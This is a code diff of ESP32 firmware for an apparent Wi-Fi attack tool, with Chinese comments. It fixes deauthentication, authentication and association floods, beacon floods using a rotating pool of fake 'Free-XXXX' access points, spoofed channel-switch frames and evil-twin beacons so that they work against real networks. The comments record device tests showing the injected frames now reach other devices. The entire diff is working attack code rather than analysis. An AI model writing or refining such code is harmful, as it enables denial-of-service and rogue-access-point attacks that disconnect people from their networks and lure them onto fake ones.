@@ -390,6 +390,9 @@ struct DeauthEngine {
   uint32_t durationMs = 0;     // 0 = 不限时
   uint32_t stopAt = 0;         // 运行期绝对截止时刻
   uint32_t startedAt = 0;
+  // 泛洪用同一源 MAC 完成 "认证 → 关联" 两阶段 (未认证的 AssocReq 会被真实 AP 直接丢弃)
+  uint8_t  floodMac[6] = {0};
+  bool     assocAuthPhase = true;
 };
 static DeauthEngine sDeauth;
 
@@ -416,6 +419,15 @@ static esp_err_t wifi80211Tx(wifi_interface_t ifx, const void *buf, int len, boo
   if (e != ESP_OK && ifx == WIFI_IF_AP) {
     e = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, sysSeq);
   }
+  return e;
+}
+
+// 信标帧专用发送路径: C5 实测经 AP 接口注入的 Beacon 虽返回 ESP_OK, 但空口上第三方网卡
+// 扫不到 (驱动对 AP 接口的 Beacon 做了特殊处理); 改由 STA 接口发出则能被正常扫描。
+// 真机验证: 同一帧 ap 接口 4 次扫描 0 命中, sta 接口 4 次扫描 4 次命中。
+static esp_err_t wifiBeaconTx(const void *buf, int len) {
+  esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, true);
+  if (e != ESP_OK) e = esp_wifi_80211_tx(WIFI_IF_AP, buf, len, true);
   return e;
 }
 
@@ -466,9 +478,7 @@ static bool buildDisassocFrameRaw(const String &bssidIn, uint8_t reason, uint8_t
 }
 
 // 认证帧 (Subtype=11, Open System) —— 泛洪用: 大量随机客户端同时请求认证。
-static uint16_t buildAuthFloodFrame(const uint8_t bssid[6], uint8_t *f) {
-  uint8_t src[6];
-  fillRandomMac(src);
+static uint16_t buildAuthFloodFrame(const uint8_t bssid[6], const uint8_t src[6], uint8_t *f) {
   f[0] = 0xB0; f[1] = 0x00;
   f[2] = 0x3A; f[3] = 0x01;
   memcpy(f + 4,  bssid, 6);      // Address 1: AP
@@ -503,10 +513,9 @@ static uint16_t buildSaeCommitFrame(const uint8_t bssid[6], uint8_t *f) {
 }
 
 // 关联请求 (Subtype=0): 认证泛洪的后续阶段, 让 AP 分配 AID/建表。
-static uint16_t buildAssocReqFrame(const uint8_t bssid[6], const String &ssidIn, uint8_t *f) {
+static uint16_t buildAssocReqFrame(const uint8_t bssid[6], const uint8_t src[6],
+                                   const String &ssidIn, uint8_t *f) {
   static const uint8_t RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
-  uint8_t src[6];
-  fillRandomMac(src);
   uint16_t i = 0;
   f[i++] = 0x00; f[i++] = 0x00;      // 管理 / Association Request
   f[i++] = 0x3A; f[i++] = 0x01;
@@ -823,6 +832,27 @@ static const char *atkTechName(uint8_t bit) {
   }
 }
 
+// 信标泛洪的假 AP 池: 扫描器/客户端通常要收到同一 BSSID 的多个信标才会上报,
+// 因此维护固定的一小组 (SSID, BSSID) 按轮询重复广播, 而不是每帧换一个新身份
+// (每帧新身份 = 每个假 AP 只出现 1 次, 真机上扫描不到)。
+#define FAKE_AP_COUNT 8
+struct FakeApEntry { uint8_t mac[6]; char ssid[12]; };
+static FakeApEntry sFakeAps[FAKE_AP_COUNT];
+static uint8_t sFakeApIdx = 0;
+static uint8_t sFakeApBurstLeft = 0;   // 当前假 AP 还需连发的信标数
+static bool sFakeApInited = false;
+static void fakeApPoolInit(bool force) {
+  if (sFakeApInited && !force) return;
+  for (int i = 0; i < FAKE_AP_COUNT; i++) {
+    fillRandomMac(sFakeAps[i].mac);
+    snprintf(sFakeAps[i].ssid, sizeof(sFakeAps[i].ssid), "Free-%04X",
+             (unsigned)(esp_random() & 0xFFFF));
+  }
+  sFakeApIdx = (uint8_t)(FAKE_AP_COUNT - 1);
+  sFakeApBurstLeft = 0;
+  sFakeApInited = true;
+}
+
 // 发送一种技术的一帧; 返回 ESP_OK 表示驱动接受 (总线成功率/错误码仍由调用方记录)。
 static esp_err_t deauthSendTech(uint16_t tech) {
   static uint8_t buf[256];
@@ -842,7 +872,7 @@ static esp_err_t deauthSendTech(uint16_t tech) {
       bool ok = false;
       esp_err_t last = ESP_FAIL;
       if (sDeauth.csaBeaconLen) {
-        last = wifi80211Tx(WIFI_IF_AP, sDeauth.csaBeacon, (int)sDeauth.csaBeaconLen, true);
+        last = wifiBeaconTx(sDeauth.csaBeacon, (int)sDeauth.csaBeaconLen);
         ok = (last == ESP_OK);
       }
       if (sDeauth.csaActionLen) {
@@ -858,11 +888,19 @@ static esp_err_t deauthSendTech(uint16_t tech) {
       break;
     }
     case ATK_AUTH_FLOOD:
-      len = (int)buildAuthFloodFrame(bssid, buf);
+      fillRandomMac(sDeauth.floodMac);
+      len = (int)buildAuthFloodFrame(bssid, sDeauth.floodMac, buf);
       break;
     case ATK_ASSOC_FLOOD: {
+      // 真实 AP 会丢弃未认证 MAC 的 AssocReq, 因此同一源 MAC 先认证再关联 (两阶段交替)。
       String ssid = sTarget.ssid.length() ? sTarget.ssid : String("probe");
-      len = (int)buildAssocReqFrame(bssid, ssid, buf);
+      if (sDeauth.assocAuthPhase) {
+        fillRandomMac(sDeauth.floodMac);
+        len = (int)buildAuthFloodFrame(bssid, sDeauth.floodMac, buf);
+      } else {
+        len = (int)buildAssocReqFrame(bssid, sDeauth.floodMac, ssid, buf);
+      }
+      sDeauth.assocAuthPhase = !sDeauth.assocAuthPhase;
       break;
     }
     case ATK_SAE_FLOOD:
@@ -871,21 +909,26 @@ static esp_err_t deauthSendTech(uint16_t tech) {
     case ATK_BCAST:
       len = (int)buildBroadcastDataFrame(bssid, buf);
       break;
-    case ATK_BEACON: {   // 随机 SSID/BSSID 的开放假 AP
-      char ssid[16];
-      snprintf(ssid, sizeof(ssid), "Free-%04X", (unsigned)(esp_random() & 0xFFFF));
-      uint8_t m[6];
-      fillRandomMac(m);
+    case ATK_BEACON: {   // 固定假 AP 池: 每个身份连发一小簇信标再轮换
+      fakeApPoolInit(false);   // 扫描器要收到同一 BSSID 的多个信标才会上报
+      if (sFakeApBurstLeft == 0) {
+        sFakeApIdx = (uint8_t)((sFakeApIdx + 1) % FAKE_AP_COUNT);
+        sFakeApBurstLeft = 6;
+      }
+      sFakeApBurstLeft--;
+      const FakeApEntry &ap = sFakeAps[sFakeApIdx];
       char bs[18];
       snprintf(bs, sizeof(bs), "%02X:%02X:%02X:%02X:%02X:%02X",
-               m[0], m[1], m[2], m[3], m[4], m[5]);
-      len = (int)buildBeaconFrameEx(String(ssid), String(bs), curCh, false, nullptr, 0, buf);
+               ap.mac[0], ap.mac[1], ap.mac[2], ap.mac[3], ap.mac[4], ap.mac[5]);
+      len = (int)buildBeaconFrameEx(String(ap.ssid), String(bs), curCh, false, nullptr, 0, buf);
       if (!len) return ESP_ERR_INVALID_ARG;
       break;
     }
     default:
       return ESP_ERR_INVALID_ARG;
   }
+  // 信标类帧统一走 STA 接口 (AP 接口注入的信标空口不可见, 详见 wifiBeaconTx)
+  if (tech == ATK_BEACON || tech == ATK_TPC_CSA) return wifiBeaconTx(buf, len);
   return wifi80211Tx(WIFI_IF_AP, buf, len, true);
 }
 
@@ -2567,6 +2610,8 @@ static bool eviltwinStartAttack(String &err) {
   for (uint8_t k = 0; k < ATK_TECH_COUNT; k++) sDeauth.techCount[k] = 0;
   sDeauth.comboIndex = 0;
   sDeauth.techCursor = 0;
+  sDeauth.assocAuthPhase = true;
+  fakeApPoolInit(true);   // 每次攻击重新生成固定假 AP 池
   sDeauth.platformBlocked = false;
   sDeauth.startedAt = millis();
   sDeauth.stopAt = sDeauth.durationMs ? (sDeauth.startedAt + sDeauth.durationMs) : 0;
@@ -3195,7 +3240,9 @@ static void handleTestBeacon() {
   if (ssid.length() == 0) ssid = "FW-BEACON-TEST";
   if (secs <= 0) secs = 20;
   if (secs > 60) secs = 60;
-  sTestBeaconIface = extractJson(body, "iface").toInt() == 1 ? 1 : 0;
+  // 默认走 STA 接口: AP 接口注入的信标空口不可见 (见 wifiBeaconTx); 显式 iface=0 才用 AP
+  if (body.indexOf("\"iface\"") >= 0) sTestBeaconIface = extractJson(body, "iface").toInt() == 0 ? 0 : 1;
+  else sTestBeaconIface = 1;
   sTestBeaconLen = buildBeaconFrame(ssid, "02:AA:BB:CC:DD:EE", (uint8_t)apChannelActive, sTestBeaconFrame);
   sTestBeaconCount = 0;
   sTestBeaconErr = 0;
@@ -3254,6 +3301,8 @@ static void handleDeauthStart() {
   for (uint8_t k = 0; k < ATK_TECH_COUNT; k++) sDeauth.techCount[k] = 0;
   sDeauth.comboIndex = 0;
   sDeauth.techCursor = 0;
+  sDeauth.assocAuthPhase = true;
+  fakeApPoolInit(true);   // 每次攻击重新生成固定假 AP 池
   sDeauth.platformBlocked = false;
   sDeauth.startedAt = millis();
   sDeauth.stopAt = sDeauth.durationMs ? (sDeauth.startedAt + sDeauth.durationMs) : 0;
@@ -5076,7 +5125,7 @@ void loop() {
       sDeauth.lastTxTime = now;
       // 先发伪造信标 (假 AP), 再发 Deauth
       if (sEvilTwin.beaconLeft > 0 && sEvilTwin.beaconLen > 0) {
-        if (wifi80211Tx(WIFI_IF_AP, sEvilTwin.beaconFrame, (int)sEvilTwin.beaconLen, true) == ESP_OK)
+        if (wifiBeaconTx(sEvilTwin.beaconFrame, (int)sEvilTwin.beaconLen) == ESP_OK)
           sEvilTwin.beaconCount++;
         sEvilTwin.beaconLeft--;
       } else if (sEvilTwin.twinFramesLeft > 0) {
@@ -5107,7 +5156,7 @@ void loop() {
         // CSA 强制下线: 广播伪造 CSA 信标 + Action 帧, 让目标客户端跟随切信道脱离真实 AP
         bool ok = false;
         if (sDeauth.csaBeaconLen &&
-            wifi80211Tx(WIFI_IF_AP, sDeauth.csaBeacon, (int)sDeauth.csaBeaconLen, true) == ESP_OK) ok = true;
+            wifiBeaconTx(sDeauth.csaBeacon, (int)sDeauth.csaBeaconLen) == ESP_OK) ok = true;
         if (sDeauth.csaActionLen)
           wifi80211Tx(WIFI_IF_AP, sDeauth.csaAction, (int)sDeauth.csaActionLen, true);
         sDeauth.txOk = ok;
